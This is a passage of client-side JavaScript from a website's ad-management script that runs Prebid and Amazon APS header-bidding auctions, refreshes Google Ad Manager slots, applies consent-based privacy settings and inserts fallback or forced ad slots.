        var forcedSlotDiv = document.getElementById(forcedAdSlot);
        if (forcedSlotDiv) {
          window._gmp.initCandidate(forcedSlotDiv);
        }
      }
    }
  };
  window._gmp.refreshSlotWhenViewable = function (slotID) {
    var slot = document.getElementById(slotID);
    if (slot) {
      window._gmp.refreshObserver.observe(slot);
    } else {
      debug && console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "trying to observe non existent slot for refresh:", slotID);
    }
  };
  var unitMap = window._gmp.unitMap;
  var slotMap = window._gmp.slotMap;
  window._gmp.delayedGAMSlots = {};
  window._gmp.slotInfoForRefresh = {};
  window._gmp.delayedRichMediaLoaders = {};
  window._gmp.gamSlots = {};
  var PREBID_TIMEOUT = window._gmp.bidderTimeout;
  var FAILSAFE_TIMEOUT = window._gmp.bidderTimeout + 500;

  /**
  * Run auctions for a set of slots
  */
  window._gmp.runAuctions = function (slots) {
    var slotIds = [];
    var pbUnits = [];
    var apsSlots = [];
    var prebidTimeout = null;
    /**
    * list of bidders that we will call for this slot
    */
    var biddersMissing = [];
    var biddersReturned = [];
    var debug = window._gmp.debug;
    debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "runAuctions slots: ", slots);
    try {
      slots.forEach(function (slot) {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "runAuctions slot: ", slot);
        window._gmp.addSlotTrackingInfo(slot.gamUnit.id, 'gam', 'requested');
        slotIds.push(slot.domElement.id);
        if (slot.pbUnit) {
          debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "runAuctions add pbunit: ", slot.pbUnit);
          pbUnits.push(slot.pbUnit);
        }
        if ('apsSizes' in slot.gamUnit && slot.gamUnit.apsSizes.length > 0) {
          apsSlots.push({
            slotID: slot.domElement.id,
            slotName: slot.gamUnit.adUnitPath,
            sizes: slot.gamUnit.apsSizes
          });
        }
      });
      if (pbUnits.length > 0) {
        biddersMissing.push('prebid');
      }
      ;
      if (window._gmp.apsEnabled && apsSlots.length > 0) {
        biddersMissing.push('aps');
      }
      ;
    } catch (e) {
      debug && console.trace("%c[gmp]", "background: rgb(242, 148, 0); color: white", "runAuctions erro: ", e);
    }
    /**
     * Prepare a closure with the GAM slots we need to refresh
     */
    var refreshGAM = function (bidder, force) {
      // currentSlot=window._gmp.slotInfoForRefresh[slotID];
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "refreshGAM for:", slotIds, bidder, force);
      if (!biddersMissing.includes(bidder) && !force) {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "bidder", bidder, "refreshGAM already returned for slot - not refreshing slot:", slotIds);
        return;
      }
      biddersMissing = biddersMissing.filter(function (item) {
        return item !== bidder;
      });
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "refreshGAM bidderMissing:", biddersMissing);
      if (biddersMissing.length == 0 || force) {
        // For all slots in queue call googletag refresh immediately or add to refresh observer, depending on slot config
        slotIds.forEach(function (slotID) {
          currentSlot = window._gmp.slotInfoForRefresh[slotID];
          window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "refreshGAM handling GAM slot:", currentSlot.domElement, currentSlot.domElement.dataset.immediate + " ");
          var slotBidReturned = [];
          if ('apsSizes' in currentSlot.gamUnit && currentSlot.gamUnit.apsSizes.length > 0 && biddersReturned.indexOf['aps']) {
            slotBidReturned.push('aps');
          }
          if (currentSlot.pbUnit && biddersReturned.indexOf['prebid']) {
            slotBidReturned.push('prebid');
          }
          var gamSlot = window._gmp.gamSlots[currentSlot.domElement.id];
          if ('immediate' in currentSlot.domElement.dataset || !window._gmp.gamRefreshObserver) {
            window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "refreshGAM immediate invocation for GAM slot:", currentSlot.domElement.id);
            window._gmp.gamRefreshQueue.push(gamSlot);
          } else {
            debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "refreshGAM setting up observer for GAM refresh:", currentSlot);
            window._gmp.gamRefreshObserver.observe(currentSlot.domElement);
          }
          currentSlot.domElement.dataset.biddersReturned = JSON.stringify(slotBidReturned);
          window._gmp.addSlotTrackingInfo(currentSlot.gamUnit.id, 'gam', 'refreshGAM refreshed');
        });
      }
    };

    /**
     * If we've never asked bids from prebid or we had any successful callback we can run prebid
     *
     * @todo: what do we do in case one or more pbUnits are empty ?
     */
    debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "runAuctions declare prebidAuctions auctions", pbUnits.length, window._gmp.prebidInit);
    if (pbUnits.length > 0 && (window._gmp.prebidInit === null || window._gmp.prebidInit)) {
      prebidTimeout = setTimeout(function () {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "runAuctions prebid timeout - refreshing GAM for slots:", pbUnits);
        googletag.cmd.push(function () {
          refreshGAM('prebid', true);
        });
        window._gmp.prebidInit = false;
      }, FAILSAFE_TIMEOUT);
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "runAuctions requesting prebids for: ", pbUnits);
      pbjs.que.push(function () {
        var adUnitCodes = pbUnits.map(function (elem) {
          return elem.code;
        });
        pbjs.addAdUnits(pbUnits);
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "runAuctions addAduits prebids for: ", pbUnits);
        pbjs.requestBids({
          adUnitCodes: adUnitCodes,
          bidsBackHandler: function () {
            window._gmp.prebidInit = true;
            biddersReturned.push('prebid');
            // Clear timeout to avoid double GAM refresh
            if (prebidTimeout) {
              debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "runAuctions successfully requested prebids, clearing timeout");
              clearTimeout(prebidTimeout);
            }
            googletag.cmd.push(function () {
              pbjs.que.push(function () {
                debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "runAuctions prebids arrived for ad unit codes:", adUnitCodes);
                pbjs.setTargetingForGPTAsync(adUnitCodes);
                refreshGAM('prebid');
                adUnitCodes.forEach(function (adUnitCode) {
                  /**
                  * @todo check whether removing the adunit code is still necessary
                  */

                  pbjs.removeAdUnit(adUnitCode);
                });
              });
            });
          },
          timeout: PREBID_TIMEOUT
        });
      });
    } else {
      // some previous iteration of PB didn't complete succesfully, we should force a GAM refresh
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "prebid no good or no units for prebid: refreshing GAM");
      googletag.cmd.push(function () {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "prebid no good or no units for prebid: refreshing GAM");
        refreshGAM('prebid', apsSlots.length == 0);
      });
    }

    /**
     * Ask APS for bids if any are needed
     */
    if (window._gmp.apsEnabled && apsSlots.length > 0) {
      var apstagTimeout = setTimeout(function () {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "apstag timeout: refreshing GAM");
        googletag.cmd.push(function () {
          refreshGAM('aps', true);
        });
        apstagInit = false;
      }, FAILSAFE_TIMEOUT);
      apstag.fetchBids({
        slots: apsSlots
      }, function (bids) {
        biddersReturned.push('aps');
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "aps bids arrived for", apsSlots);
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "aps bids:", bids);
        // Clear timeout to avoid double GAM refresh
        if (apstagTimeout) {
          debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "successfully received aps bids, clearing timeout");
          clearTimeout(apstagTimeout);
        }
        googletag.cmd.push(function () {
          apstag.setDisplayBids();
          refreshGAM('aps', pbUnits.length == 0);
        });
      });
    }
  };

  /**
   * Request bids for a slot
   * @param {object} currentSlot
   */
  window._gmp.requestBids = function (currentSlot) {
    /**
     * list of bidders that we will call for this slot
     */
    var biddersMissing = ['prebid', 'aps'];
    var biddersReturned = [];

    /**
     * Prepare a closure with the GAM slots we need to refresh
     */
    var refreshGAM = function (bidder, force) {
      if (!biddersMissing.includes(bidder) && !force) {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "bidder", bidder, " already returned for slot - not refreshing slot:", currentSlot);
        return;
      }
      biddersMissing = biddersMissing.filter(function (item) {
        return item !== bidder;
      });
      if (biddersMissing.length == 0 || force) {
        var gamSlot = window._gmp.gamSlots[currentSlot.gamUnit.id];
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "refreshing slot: ", currentSlot.gamUnit);
        // googletag.pubads().refresh([gamSlot]);
        window._gmp.gamRefreshQueue.push(gamSlot);
        currentSlot.domElement.dataset.biddersReturned = JSON.stringify(biddersReturned);
        window._gmp.addSlotTrackingInfo(currentSlot.gamUnit.id, 'gam', 'refreshed');
      }
    };
    window._gmp.addSlotTrackingInfo(currentSlot.gamUnit.id, 'gam', 'requested');
    var prebidTimeout = null;

    /**
     * If we've never asked bids from prebid or we had any successful callback we can run prebid
     *
     * @todo: what do we do in case one or more pbUnits are empty ?
     */
    if ('pbUnit' in currentSlot && currentSlot.pbUnit && (window._gmp.prebidInit === null || window._gmp.prebidInit)) {
      prebidTimeout = setTimeout(function () {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "prebid timeout - refreshing GAM for slot:", currentSlot);
        googletag.cmd.push(function () {
          refreshGAM('prebid');
        });
        window._gmp.prebidInit = false;
      }, FAILSAFE_TIMEOUT);
      pbjs.que.push(function () {
        pbjs.addAdUnits([currentSlot.pbUnit]);
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "requesting prebids: ", currentSlot.pbUnit);
        pbjs.requestBids({
          adUnitCodes: [currentSlot.pbUnit.code],
          bidsBackHandler: function () {
            window._gmp.prebidInit = true;
            biddersReturned.push('prebid');
            // Clear timeout to avoid double GAM refresh
            if (prebidTimeout) {
              debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "successfully requested prebids, clearing timeout");
              clearTimeout(prebidTimeout);
            }
            googletag.cmd.push(function () {
              pbjs.que.push(function () {
                debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "prebids arrived:", currentSlot.pbUnit);
                pbjs.setTargetingForGPTAsync([currentSlot.pbUnit.code]);
                refreshGAM('prebid');
                debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "removing pbjs ad unit:", currentSlot.pbUnit.code);
                pbjs.removeAdUnit(currentSlot.pbUnit.code);
              });
            });
          },
          timeout: PREBID_TIMEOUT
        });
      });
    } else {
      // some previous iteration of PB didn't complete succesfully, we should force a GAM refresh
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "prebid no good or no units for prebid: refreshing GAM", currentSlot);
      googletag.cmd.push(function () {
        refreshGAM('prebid');
      });
    }

    /**
     * Ask APS for bids if any are needed
     */
    if (window._gmp.apsEnabled && 'apsSizes' in currentSlot.gamUnit && currentSlot.gamUnit.apsSizes.length > 0) {
      var apsSlots = [{
        slotID: currentSlot.gamUnit.id,
        slotName: currentSlot.gamUnit.adUnitPath,
        sizes: currentSlot.gamUnit.apsSizes
      }];
      var apstagTimeout = setTimeout(function () {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "apstag timeout: refreshing GAM");
        googletag.cmd.push(function () {
          refreshGAM('aps');
        });
        apstagInit = false;
      }, FAILSAFE_TIMEOUT);
      apstag.fetchBids({
        slots: apsSlots
      }, function (bids) {
        biddersReturned.push('aps');
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "aps bids arrived for", currentSlot.gamUnit.id);
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "aps bids:", bids);
        // Clear timeout to avoid double GAM refresh
        if (apstagTimeout) {
          debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "successfully received aps bids, clearing timeout");
          clearTimeout(apstagTimeout);
        }
        googletag.cmd.push(function () {
          apstag.setDisplayBids();
          refreshGAM('aps');
        });
      });
    } else {
      googletag.cmd.push(function () {
        refreshGAM('aps');
      });
    }
  };
  var googletag = window.googletag;
  if (window._gmp.consentNeeded && window._gmp.googleConsent === 0) {
    debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "no consent at all for google ads - skipping GAM init");
  } else {
    googletag.cmd.push(function () {
      googletag.pubads().enableSingleRequest();
      googletag.pubads().disableInitialLoad();
      if (typeof window._gmp.section !== 'undefined' && window._gmp.section) {
        googletag.pubads().setTargeting('filmtv_section', window._gmp.section);
      }
      if (typeof window._gmp.pageType !== 'undefined' && window._gmp.pageType) {
        googletag.pubads().setTargeting('pagetype', window._gmp.pageType);
      }
      if (typeof window._gmp.explicit !== 'undefined' && window._gmp.explicit) {
        googletag.pubads().setTargeting('explicit', 'true');
      }
      if (window._gmp.customTargeting) {
        try {
          for (const k in window._gmp.customTargeting) {
            const v = window._gmp.customTargeting[k];
            debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "sending targeting key", k, "to", v);
            googletag.pubads().setTargeting(k, v);
          }
        } catch (err) {
          console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "error sending user defined targeting variables:", err);
        }
      }
      if (window._gmp.googleConsent === 1) {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "consent only for google non-personalized ads");
        googletag.pubads().setPrivacySettings({
          nonPersonalizedAds: true
        });
      } else if (window._gmp.googleConsent === 4) {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "consent only for limited ads");
        googletag.pubads().setPrivacySettings({
          limitedAds: true
        });
      } else if (window._gmp.hasOwnProperty('encryptedUserID')) {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "setting PPID from publisher");
        googletag.pubads().setPublisherProvidedId(window._gmp.encryptedUserID);
      } else {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "setting PPID from UID");
        googletag.pubads().setPublisherProvidedId(window._gmp.track.uid);
      }
      googletag.enableServices();
    });
  }
  window.pbjs = window.pbjs || {};
  window.pbjs.que = window.pbjs.que || [];
  function getDeviceType(bidRequest, bidResponse) {
    var deviceType = window._gmp.mobile ? 'mobile' : 'desktop';
    return deviceType;
  }
  pbjs.que.push(function () {
    var pbjsConfigObject = {
      useBidCache: true,
      priceGranularity: "dense",
      currency: {
        adServerCurrency: "EUR",
        defaultRates: {
          "USD": {
            "EUR": 0.931012
          }
        }
      },
      enableSendAllBids: false,
      targetingControls: {
        alwaysIncludeDeals: true
      },
      userSync: {
        filterSettings: {
          iframe: {
            bidders: '*',
            // '*' represents all bidders
            filter: 'include'
          }
        },
        userIds: [{
          name: "criteo"
        }],
        auctionDelay: 50
      },
      improvedigital: {
        usePrebidSizes: true
      },
      rubicon: {
        singleRequest: true
      },
      floors: {
        data: {
          // default if endpoint doesn't return in time
          currency: 'EUR',
          skipRate: 0,
          default: 0.00,
          modelVersion: '1.1',
          schema: {
            fields: ['mediaType', 'deviceType']
          },
          values: {}
        },
        additionalSchemaFields: {
          deviceType: getDeviceType // where getDeviceType is the function reference for your lookup function
        }
      }
    };
    pbjsConfigObject.userSync.userIds.push({
      name: "id5Id",
      params: {
        partner: 396
      },
      storage: {
        type: "html5",
        name: "id5id",
        expires: 90,
        refreshInSeconds: 8 * 3600
      }
    });
    if (window._gmp.schainConfigNodes) {
      pbjsConfigObject.schain = {
        validation: "strict",
        config: {
          ver: "1.0",
          complete: 1,
          nodes: window._gmp.schainConfigNodes
        }
      };
    }
    if (window._gmp.filters.prebidConfig && Array.isArray(window._gmp.filters.prebidConfig)) {
      window._gmp.filters.prebidConfig.forEach(function (prebidConfigFilter, idx) {
        if (typeof prebidConfigFilter == 'function') {
          pbjsConfigObject = prebidConfigFilter(pbjsConfigObject);
        } else {
          console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "prebidConfig filter not a function:", prebidConfigFilter);
        }
      });
    }
    if (window._gmp.consentNeeded) {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "consent needed - setting consentManagement property for pbjs config");
      pbjsConfigObject.consentManagement = {
        gdpr: {
          cmpApi: "iab",
          timeout: 8000,
          allowAuctionWithoutConsent: true
        }
      };
    } else {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "consent not needed - not setting consentManagement property for pbjs config");
    }
    pbjs.setConfig(pbjsConfigObject);
    pbjs.aliasBidder('pubmatic', 'pubmatic_apex');
    pbjs.aliasBidder('appnexus', 'zodiac');
    // pbjs.aliasBidder('appnexus', 'quantum_apnxs');

    if (window._gmp.customBidderConfig) {
      if (Array.isArray(window._gmp.customBidderConfig)) {
        window._gmp.customBidderConfig.forEach(function (config) {
          pbjs.setBidderConfig(config);
        });
      } else {
        pbjs.setBidderConfig(window._gmp.customBidderConfig);
      }
    }
  });
  pbjs.bidderSettings = {
    standard: {
      storageAllowed: true
    }
  };

  /**
   * Set up events for slot successfully rendered
   */
  googletag.cmd.push(function () {
    googletag.pubads().addEventListener('slotRenderEnded', function (event) {
      var slotID = event.slot.getSlotElementId();
      var slot;
      try {
        if (slotID in window._gmp.gamSlots) {
          window._gmp.addSlotTrackingInfo(slotID, 'gam', 'rendered', event);
        } else {
          debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "do not track GAM slots not belonging to us - no fallback logic:", slotID);
          return;
        }
      } catch (err) {
        debug && console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "error tracking slotRenderEnded for:", event.slot);
      }
      var s = document.getElementById(slotID);
      if ('type' in s.dataset && s.dataset.type in window._gmp.components && typeof window._gmp.components[s.dataset.type].renderEnded == 'function') {
        window._gmp.components[s.dataset.type].renderEnded(s, event);
      }

      // let's see if we have an empty slot and a fallback unit:
      if (event.isEmpty) {
        try {
          var oldSlot = document.getElementById(slotID);
          var fallbackSlotID = slotID + '-fallback';
          if (slotID.startsWith(window._gmp.class + "-intext-ad-") && !slotID.endsWith('-fallback')) {
            if (window._gmp.unitMap[window._gmp.intextAdUnit].hasOwnProperty('fallbackUnit')) {
              // remove previous slot
              var newSlot = window._gmp.insertSlot(window._gmp.unitMap[window._gmp.intextAdUnit].fallbackUnit, oldSlot, 'before', fallbackSlotID);
              oldSlot.remove();
              delete window._gmp.slotMap[slotID];
              window._gmp.setupSlot(newSlot);
            }
            return;
          }
          if (slotID in window._gmp.slotMap && window._gmp.slotMap[slotID].hasOwnProperty('fallbackUnit')) {
            var fallbackUnit = window._gmp.slotMap[slotID].fallbackUnit;
            if ('isFallback' in oldSlot.dataset) {
              debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "not doing fallback on a fallback unit:", oldSlot);
              return;
            }
            // Set up fallback slot with appropriate unit and sizes
            debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "preparing fallback slot", fallbackSlotID, "for:", oldSlot);
            var fallbackSlot = document.createElement('div');
            fallbackSlot.setAttribute('id', fallbackSlotID); // set id
            fallbackSlot.setAttribute('class', window._gmp.class); // set class
            fallbackSlot.dataset.adUnit = fallbackUnit;
            if (slotID == '') {
              debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "skin fallback slot - fixing size:", fallbackSlotID);
              fallbackSlot.dataset.immediate = '';
              fallbackSlot.style.height = '1px';
              fallbackSlot.dataset.gamSizes = JSON.stringify(window._gmp.unitMap[fallbackUnit].gamSizes);
            } else {
              fallbackSlot.dataset.gamSizes = oldSlot.dataset.gamSizes;
            }
            // Set up prebid sizes if available
            if ('pbSizes' in oldSlot.dataset) {
              fallbackSlot.dataset.pbSizes = oldSlot.dataset.pbSizes;
            } else if ('pbSizes' in window._gmp.unitMap[fallbackUnit]) {
              fallbackSlot.setAttribute('data-pb-sizes', JSON.stringify(window._gmp.unitMap[fallbackUnit].pbSizes));
            }
            // Mark this as a fallback unit
            fallbackSlot.dataset.isFallback = '1';

            // insert before previous slot
            oldSlot.parentNode.insertBefore(fallbackSlot, oldSlot);
            // remove previous slot
            oldSlot.remove();
            delete window._gmp.slotMap[slotID];
            debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "setting up fallback slot", fallbackSlot);
            window._gmp.setupSlot(fallbackSlot);
          }
          if (slotID in window._gmp.slotMap && window._gmp.slotMap[slotID].hasOwnProperty('onEmptyAdSlot')) {
            window._gmp.setupFallbackAdSlots(Array.of(window._gmp.slotMap[slotID].onEmptyAdSlot), slotID);
          } else {
            if (slotID in window._gmp.slotMap && window._gmp.slotMap[slotID].hasOwnProperty('onCloseAdSlots')) {
              if (!('type' in s.dataset && s.dataset.type in window._gmp.components && typeof window._gmp.components[s.dataset.type].renderClose == 'function')) {
                debug && console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "warning setting up on close fallback AdSlot for:", slotID, "the slot is not closable");
              } else {
                window._gmp.setupFallbackAdSlots(window._gmp.slotMap[slotID].onCloseAdSlots, false);
              }
            }
          }
        } catch (err) {
          debug && console.error("%c[gmp]", "background: rgb(242, 148, 0); color: white", "error setting up fallback slot for:", slotID, "- error:", err);
        }
      } else {
        if ('type' in s.dataset) {
          switch (s.dataset.type) {
            case 'skin':
              console.log('Skin');
              debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "skin full - size:", event.size);
              if (Array.isArray(event.size) && event.size[0] == 1800 && event.size[1] == 1200) {
                debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "programmatic skin - do we need to apply CSS fixes ?");
                if (typeof window._gmp.fixProgrammaticSkin == "function") {
                  window._gmp.fixProgrammaticSkin();
                }
              }
              break;
            case 'intropage':
              console.log('Intropage');
              if (typeof window._gmp.setupIntropageLayout == "function") {
                window._gmp.setupIntropageLayout();
              }
              break;
            case 'mobskin':
              console.log('Mobpage');
              break;
            default:
              console.log('Normal slot - noop');
          }
        }

        /**
         * Set-up refresh when necessary
         *
         * @todo make it unconditional on viewability when so requested
         */
        if ((slotID in window._gmp.slotMap && window._gmp.slotMap[slotID].hasOwnProperty('refreshInterval') || 'refreshInterval' in s.dataset && s.dataset.refreshInterval) && window._gmp.refreshObserver) {
          var refreshInterval;
          if ('refreshInterval' in s.dataset && s.dataset.refreshInterval) {
            refreshInterval = s.dataset.refreshInterval * 1000;
          } else {
            refreshInterval = window._gmp.slotMap[slotID]['refreshInterval'] * 1000;
          }
          debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "setting timeout for refreshing slot", slotID, "in", window._gmp.slotMap[slotID]['refreshInterval'], "seconds");
          setTimeout(function () {
            debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "scheduling refreshing for slot after interval:", slotID);
            window._gmp.gamSlots[slotID].setTargeting('adp-optimized', '1');
            if (window._gmp.ignoreViewability) {
              if (slotID in window._gmp.gamSlots) {
                var slot = window._gmp.gamSlots[slotID];
                googletag.pubads().clear([slot]);
                // googletag.pubads().refresh([slot]);
                var currentSlot = window._gmp.slotInfoForRefresh[slotID];
                window._gmp.auctionQueue.push(currentSlot);
              }
            } else {
              window._gmp.refreshSlotWhenViewable(slotID);
            }
          }, refreshInterval);
        }
      }
    });
    googletag.pubads().addEventListener('impressionViewable', function (event) {
      var slotID = event.slot.getSlotElementId();
      try {
        var s = document.getElementById(slotID);
        if ('type' in s.dataset && s.dataset.type in window._gmp.components) {
          if (debug) {
            var lag = Math.round(performance.now()) - window._gmp.track.advStart;
            debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "component of type", s.dataset.type, "visibile after", lag);
          }
          if (typeof window._gmp.components[s.dataset.type].impressionViewable == "function") {
            window._gmp.components[s.dataset.type].impressionViewable(s, event);
          }
        }
      } catch (err) {
        debug && console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "error tracking impressionViewable for:", event.slot);
      }
    });
  });

  /**
   * Dispatch event to notify listeners that we are ready to accept
   * calls to setupSlot
   */
  googletag.cmd.push(function () {
    var gamEvent = document.createEvent('Event');
    gamEvent.initEvent('gaminit', true, true);
    document.dispatchEvent(gamEvent);
    window._gmp.gamInit = true;
  });
  /**
  * Prevent the callbackslot slots to be activate
  *
  */
  for (var slotWithFalbackSlot in window._gmp.slotMap) {
    if (window._gmp.slotMap[slotWithFalbackSlot].hasOwnProperty('onCloseAdSlots')) {
      for (var fallbackSlot of window._gmp.slotMap[slotWithFalbackSlot].onCloseAdSlots) {
        if (!(fallbackSlot in window._gmp.slotMap)) {
          debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "fallabackAdSlot", forcedAdSlot, " not found in slotMap");
          continue;
        }
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "Update info ", fallbackSlot, "as fallback ");
        window._gmp.slotMap[fallbackSlot].isFallbackSlot = true;
      }
    }
    if (window._gmp.slotMap[slotWithFalbackSlot].hasOwnProperty('onEmptyAdSlot')) {
      if (!(window._gmp.slotMap[slotWithFalbackSlot].onEmptyAdSlot in window._gmp.slotMap)) {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "fallabackAdSlot", forcedAdSlot, " not found in slotMap");
        continue;
      }
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "Update info ", window._gmp.slotMap[slotWithFalbackSlot].onEmptyAdSlot, "as fallback ");
      window._gmp.slotMap[window._gmp.slotMap[slotWithFalbackSlot].onEmptyAdSlot].isFallbackSlot = true;
    }
  }

  /**
   * Init slot elements that override the init of gmp using his own init
   * method
   */
  googletag.cmd.push(function () {
    for (var initSlot in window._gmp.slotMap) {
      try {
        if (window._gmp.slotMap[initSlot].type in window._gmp.components && typeof window._gmp.components[slotMap[initSlot].type].init == 'function') {
          window._gmp.components[slotMap[initSlot].type].init(initSlot);
        }
      } catch (err) {
        debug && console.error("%c[gmp]", "background: rgb(242, 148, 0); color: white", "error while init component ad slot:", initSlot, ": ", err);
      }
    }
  });

  /**
   * This method check if the slot is to be forced on page
   * @param {String} forcedAdSlot slot identifier
   * @returns null
   */
  window._gmp.forceAdSlot = function (forcedAdSlot) {
    if (!window._gmp.isSlotToBeShown(forcedAdSlot)) {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "not showing forced slot", forcedAdSlot, "to user of type", window._gmp.userType);
      return;
    }

    //disable init if the components has his own init method
    if (window._gmp.slotMap[forcedAdSlot].type in window._gmp.components && typeof window._gmp.components[slotMap[forcedAdSlot].type].init == 'function') {
      return;
    }
    try {
      // Check whether document.getElementById(forcedAdSlot) ?
      var forcedSlotDiv = document.getElementById(forcedAdSlot);
      if (!forcedSlotDiv &&
      // run only if div not present
      window._gmp.slotMap[forcedAdSlot].force === true && (
      // run only if div should be forced
      // should this slot be forced on pages of this type ?
      !slotMap[forcedAdSlot].hasOwnProperty('pageType') || window._gmp.slotMap[forcedAdSlot].pageType.indexOf(window._gmp.pageType) > -1) && (
      // should this slot be forced on devices of this type ?
      !slotMap[forcedAdSlot].devices ||
      // if devices are not set, show everywhere

      window._gmp.mobile && window._gmp.slotMap[forcedAdSlot].devices.indexOf('mobile') > -1 || !window._gmp.mobile && window._gmp.slotMap[forcedAdSlot].devices.indexOf('desktop') > -1)) {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "going to force:", forcedAdSlot);

        // Set up new div
        forcedSlotDiv = document.createElement('div');
        forcedSlotDiv.setAttribute('id', forcedAdSlot); // set id
        forcedSlotDiv.setAttribute('class', window._gmp.class); // set class

        if (forcedAdSlot == '') {
          debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "skin slot - hiding:", forcedAdSlot);
          forcedSlotDiv.style.height = '1px';
        }

        // GAM slot
        if (window._gmp.slotMap[forcedAdSlot].hasOwnProperty('gamSizes')) {
          forcedSlotDiv.setAttribute('data-ad-unit', window._gmp.slotMap[forcedAdSlot].unit); // set ad unit
          forcedSlotDiv.setAttribute('data-gam-sizes', JSON.stringify(window._gmp.slotMap[forcedAdSlot].gamSizes)); // set ad unit sizes
          if ('pbSizes' in window._gmp.slotMap[forcedAdSlot]) {
            forcedSlotDiv.setAttribute('data-pb-sizes', JSON.stringify(window._gmp.slotMap[forcedAdSlot].pbSizes)); // set prebid sizes
          }
          if ('bidderData' in window._gmp.slotMap[forcedAdSlot]) {
            forcedSlotDiv.setAttribute('data-bidder-data', JSON.stringify(window._gmp.slotMap[forcedAdSlot].bidderData)); // set bidder data
          }
          if ('apsSizes' in window._gmp.slotMap[forcedAdSlot]) {
            forcedSlotDiv.setAttribute('data-aps-sizes', JSON.stringify(window._gmp.slotMap[forcedAdSlot].apsSizes)); // set aps sizes
          }
        }
        if (window._gmp.slotMap[forcedAdSlot].hasOwnProperty('type')) {
          forcedSlotDiv.setAttribute('data-type', window._gmp.slotMap[forcedAdSlot].type); // set type of ad slot
        }
        if (window._gmp.slotMap[forcedAdSlot].hasOwnProperty('immediate') && window._gmp.slotMap[forcedAdSlot]['immediate']) {
          forcedSlotDiv.setAttribute('data-immediate', '');
        }
        if (window._gmp.slotMap[forcedAdSlot].hasOwnProperty('showToSubscribers') && window._gmp.slotMap[forcedAdSlot]['showToSubscribers']) {
          forcedSlotDiv.setAttribute('data-show-to-subscribers', '');
        }
        var forcedSlotPosition = document.querySelector(window._gmp.slotMap[forcedAdSlot].insert.selector);
        if (!forcedSlotPosition) {
          debug && console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "could not find position for forced ad slot:", forcedAdSlot, ": ", window._gmp.slotMap[forcedAdSlot].insert.selector);
          return;
        }
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "inserting", window._gmp.slotMap[forcedAdSlot].insert.position, window._gmp.slotMap[forcedAdSlot].insert.selector);
        switch (window._gmp.slotMap[forcedAdSlot].insert.position) {
          case "before":
            forcedSlotPosition.parentNode.insertBefore(forcedSlotDiv, forcedSlotPosition);
            break;
          case "after":
